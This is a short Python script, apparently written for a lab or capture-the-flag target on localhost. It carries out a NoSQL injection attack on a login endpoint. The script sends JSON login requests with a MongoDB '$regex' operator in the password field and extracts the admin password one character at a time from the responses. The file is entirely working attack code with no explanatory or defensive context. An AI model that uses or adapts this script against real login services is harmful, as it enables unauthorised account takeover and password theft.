#!/usr/bin/python3

from pwn import *
import requests, time, sys, signal, string

def def_handler(sig,frame):
    print("\n\n[!] Exit...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Globals variables
login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNOSQLI():

    password = ""
    p1 = log.progress("Brute Force")
    p1.status("Start process...")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(0,24):
        for character in characters:

            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password,character)

            p1.status(post_data)
            
            headers = {'Content-Type': 'application/json'}
            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break 

if __name__ == '__main__':
    makeNOSQLI()
